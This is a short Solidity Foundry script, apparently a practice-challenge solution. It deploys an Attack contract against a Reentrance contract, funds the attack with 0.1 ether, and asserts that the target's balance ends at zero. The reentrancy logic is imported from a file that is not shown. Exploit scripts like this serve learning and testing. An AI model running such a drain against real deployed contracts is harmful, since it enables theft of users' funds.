// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";

import {Reentrance} from "../src/Reentrance.sol";
import {Attack} from "../src/Attack.sol";

contract CounterScript is Script {
    function run() public {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        address deployer = vm.rememberKey(deployerPrivateKey);

        vm.startBroadcast(deployer);

        Reentrance reentrance = Reentrance(payable(vm.envAddress("REENTRANCE")));
        Attack attack = new Attack(address(reentrance));
        attack.attack{value: 0.1 ether}();
        assert(address(reentrance).balance == 0);

        vm.stopBroadcast();
    }
}
